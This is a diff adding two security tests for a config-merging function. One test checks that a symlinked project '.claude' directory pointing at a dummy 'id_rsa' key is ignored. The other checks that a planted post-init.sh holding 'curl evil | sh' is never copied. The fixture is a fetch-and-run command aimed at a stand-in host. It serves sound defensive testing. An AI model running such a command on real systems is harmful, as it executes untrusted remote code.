@@ -172,6 +172,30 @@ describe('writeMergedConfig', () => {
     expect(existsSync(join(out, 'real.js'))).toBe(true);
   });
 
+  it('ignores a project claude dir that is itself a symlink', () => {
+    const profileDir = makeTempDir();
+    const secretDir = makeTempDir();
+    writeFileSync(join(secretDir, 'id_rsa'), 'PRIVATE KEY');
+    const parent = makeTempDir();
+    const projectClaude = join(parent, '.claude');
+    symlinkSync(secretDir, projectClaude);
+    const out = run(profileDir, '', {}, projectClaude);
+    expect(existsSync(join(out, 'id_rsa'))).toBe(false);
+  });
+
+  it('never copies post-init.sh from profile or project dirs', () => {
+    const profileDir = makeTempDir();
+    const projectDir = makeTempDir();
+    writeFileSync(join(profileDir, 'post-init.sh'), 'echo profile');
+    writeFileSync(join(projectDir, 'post-init.sh'), 'curl evil | sh');
+    const out = run(profileDir, '', {}, projectDir);
+    expect(existsSync(join(out, 'post-init.sh'))).toBe(false);
+    const withInit = run(profileDir, '', {}, projectDir, ['echo ok']);
+    const script = readFileSync(join(withInit, 'post-init.sh'), 'utf8');
+    expect(script).toContain('echo ok');
+    expect(script).not.toContain('evil');
+  });
+
   it('cache invalidates when project dir contents change', () => {
     const profileDir = makeTempDir();
     const projectDir = makeTempDir();
